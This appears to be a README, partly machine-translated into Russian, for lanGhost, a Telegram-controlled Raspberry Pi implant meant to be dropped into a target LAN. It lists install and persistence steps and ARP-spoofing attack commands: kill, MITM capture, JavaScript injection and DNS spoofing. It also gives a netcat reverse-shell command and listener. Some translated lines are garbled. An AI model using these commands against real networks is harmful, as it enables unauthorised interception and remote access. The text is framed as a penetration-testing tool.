<p align=center>
<a href="https://github.com/xdavidhu/lanGhost/blob/master/README.MD"><img src="https://github.com/xdavidhu/lanGhost/raw/master/img/lanGhost.png"/>
</a>
<a href="https://travis-ci.org/xdavidhu/lanGhost">
    <img src="https://travis-ci.org/xdavidhu/lanGhost.svg?branch=master" align=center/>
</a>
<a href="https://github.com/xdavidhu/lanGhost">
    <img src="https://img.shields.io/badge/python-3.3%2C%203.4%2C%203.5%2C%203.6-brightgreen.svg" align=center/>
</a>
<a href="https://github.com/xdavidhu/lanGhost/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/license-MIT-blue.svg" align=center/>
</a>
<a href="https://github.com/xdavidhu/lanGhost">
    <img src="https://img.shields.io/github/stars/xdavidhu/lanGhost.svg" align=center/>
</a>
</p>

<h3 align=center>⚠️ Предупреждение! Этот проект больше не поддерживается и может не работать как исключение.</h3>

<h3 align=center><i>Чат-бот Dropbox в локальной сети, управляемый через Telegram</i></h3>

<h1 align=center>функции:</h1>
<p align=center>
<a href="https://github.com/xdavidhu/lanGhost/blob/master/README.MD"><img src="https://raw.githubusercontent.com/xdavidhu/lanGhost/master/img/features.png"/></a>
</p>

<br><br>

<p align=center>
<a href="https://github.com/xdavidhu/lanGhost/blob/master/DEMOS.MD"><img src="img/demos-button.png" align=center width=40%/></a>
<br><br><br>
</p>

<h1 align=center>установка:</h1>

<h3 align=center>предупреждение:</h3>

<p align=center>lanGhost разработан для <b> Raspberry Pis </b> (<b> Raspbian </b> / <b> Kali для RPi </b>). Запуск его на других / настольных дистрибутивах может вызвать проблемы и может не работать как исключение.</p>

Вам понадобится ** Raspberry Pi ** с ** свежим Raspbian / Kali ** на SD-карте, потому что вы не хотите, чтобы что-либо еще работало в фоновом режиме.

Загрузите Pi, получите SSH-продажу или подключите монитор и клавиатуру и введите следующие команды:

```
$ sudo apt update && sudo apt install python3 python3-pip
$ git clone https://github.com/Durka22/lanGhost-termux.git
$ cd lanGhost
$ bash setup.py
```

Пожалуйста, ** прочтите ** вопросы / сообщения при запуске сценария установки!
<h4>step 1/4 - setup.py</h4>

```
[+] Введите имя подключенного сетевого интерфейса / будет
быть подключенным к целевой LAN. Проводной интерфейс по умолчанию - eth0,
а беспроводной интерфейс по умолчанию - wlan0 в большинстве систем, но
вы можете проверить это в другом терминале с помощью команды ifconfig.
```

<h4>шаг 2/4 - setup.py</h4>

```
[+] Создайте ключ API Telegram, отправив сообщение @BotFather в Telegram
с командой '/newbot'.

После этого @BotFather попросит вас выбрать имя для вашего бота.
Это может быть что угодно.

Наконец, @BotFather попросит вас указать имя пользователя для вашего бота. У тебя есть
чтобы выбрать здесь уникальное имя пользователя, которое заканчивается на «бот». За
пример: xdavidbot. Запишите это имя пользователя, так как позже
вам нужно будет искать это, чтобы найти своего бота, который lanGhost
будет работать дальше.

После того, как вы отправите свое имя пользователя на @BotFather, вы получите
ваш ключ API.
```

<p align=center>
<img src="https://github.com/xdavidhu/lanGhost/raw/master/img/screenshot-telegram-1.png"/>
<br><br>
<img src="https://github.com/xdavidhu/lanGhost/raw/master/img/screenshot-telegram-2.png"/>
</p>

<h4>step 3/4 - setup.py</h4>

```
[+] Теперь, чтобы lanGhost разрешал доступ только вам, вам нужно подтвердить себя.

Отправьте проверочный код, указанный ниже, ТОЧНОМУ, который вы только что создали. Просто найдите свой
@username бота (то, что вы отправили @BotFather), чтобы найти его.

[+] Код подтверждения для отправки: ******
```

<p align=center>
<img src="https://github.com/xdavidhu/lanGhost/raw/master/img/screenshot-telegram-3.png"/>
</p>

<h4>step 4/4 - setup.py</h4>

```
[+] Вы хотите, чтобы lanGhost запускался при загрузке? Эта опция необходима, если вы используете
это устройство как Dropbox, потому что, когда вы собираетесь бросить это устройство в
сети, у вас не будет возможности запустить lanGhost удаленно! (автозапуск работает
добавив новую запись cron '@reboot')
```

<h3 align=center>Если вы готовы с настройкой, просто перезагрузите Pi, и lanGhost запустится!</3>
<br><br>
<p align=center>
<img src="https://github.com/xdavidhu/lanGhost/raw/master/img/screenshot-telegram-4.png"/>
</p>

<h1 align=center>usage:</h1>

<h3 align=center>warnings:</h3>

<p align=center>Using lanGhost on a networks bigger than /24 is <b>not recommended</b> because the scans will take too long.</p>

<p align=center>lanGhost is <b>not quiet</b>. Anyone monitoring the traffic can see the ARP packets!</p>

<h3>drop it into a network:</h3>

If you have selected `yes` at `step 4/4 (autostart)` the Pi is fully set up for dropping. lanGhost should start up on boot, and send you a message on Telegram with the text: `lanGhost started! 👻`.

Make sure to try it out in your lab first and test if lanGhost is responding to your messages!

If you are all set, just connect it to the target network by plugging in the Ethernet cable into the Pi and connecting the power via micro USB and you are ready to go!

(lanGhost can also work over WiFi, but you will need to set up `wpa_supplicant` to connect to the network automatically first)

<h3>available commands:</h3>

```
/ scan - сканировать локальную сеть
/ scanip [TARGET-IP] - сканировать определенный IP-адрес.
/ kill [TARGET-IP] - Остановить сетевое соединение цели.
/ mitm [TARGET-IP] - Захват HTTP / DNS-трафика от цели.
/ replaceimg [TARGET-IP] - Заменить HTTP-образы, запрошенные целью.
/ injectjs [TARGET-IP] [JS-FILE-URL] -Внедрить JavaScript в HTTP-страницы, запрошенные целью.
/ spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP] - Подмена DNS-записей для цели.
/ attack - Просмотр текущих атак.
/ stop [ATTACK-ID] - Остановить текущую атаку.
/ restart - перезапустить lanGhost.
/ reversesh [TARGET-IP] [PORT] - Создать обратную оболочку netcat для цели.
/ help - Показать меню справки.
/ping - Pong.
```

<h3>attack system:</h3>

You can start an attack by using one of these commands: `/kill, /mitm, /replaceimg, /injectjs, /spoofdns`

Ater you have one or more attacks running, you can use the `/attack` command to get a list of them containing the `ATTACK-ID`'s.

To stop an attack type `/stop [ATTACK-ID]`.

<h3>reverse shell:</h3>

<h3 align=center>warning:</h3>

<p align=center><code>/reversesh</code> only makes a netcat TCP connection which is not encrypted and all the traffic can be monitored! Only use it for emergency fixes or for setting up an encrypted reverse connection if necessary.</p>

The `/reversesh` command is for getting a reverse shell on the Pi, when its not accessable from the outside.

To use the `/reversesh` command you will need to have a server listening for the shell.

Netcat command to start up the listener on your server:

```
$ nc -l 0.0.0.0 [PORT]
```

Telegram command:

```
/reversesh [IP-of-your-listening-server] [PORT]
```

<h3>нападения:</h3>

 * `/ kill` - останавливает подключение к Интернету для цели.
 * `/ mitm` - захватывает HTTP- и DNS-трафик от цели и отправляет его в текстовых сообщениях.
 * `/ replaceimg` - Заменяет HTTP-изображения для цели на то, что вы отправляете боту.
 * `/ injectjs` - внедряет JavaScript в каждый ответ HTTP HTML для цели.
 Вам необходимо разместить JS-файл на своем сервере и указать URL-адрес в качестве параметра.
 * `/ spoofdns` - Имитирует ответы DNS для цели.

Все атаки используют ** ARP Spoofing **!

<h3>сканированиеs:</h3>

 * `/ scan` - Сканирует локальную сеть и возвращает хосты в оперативный режим. Использует nmap -sn scan для обнаружения хостов.
 * `/ scanip` - Сканирует IP-адрес на предмет открытых портов и другой информации. Использует сканирование nmap -sS.

<h3>notifications:</h3>

You will get a message every time when a new device connects/leaves the network.

<h1 align=center>disclaimer:</h1>

<h3 align=center>I'm not responsible for anything you do with this program, so please only use it for good and educational purposes.</h3>

<h1 align=center>legal:</h1>

<p align=center>
Copyright (c) 2018 by David Schütz. Some rights reserved.<br><br>
lanGhost is under the terms of the MIT License, following all clarifications stated in the license file. You can also go ahead and email me at xdavid{at}protonmail{dot}com.
</p>
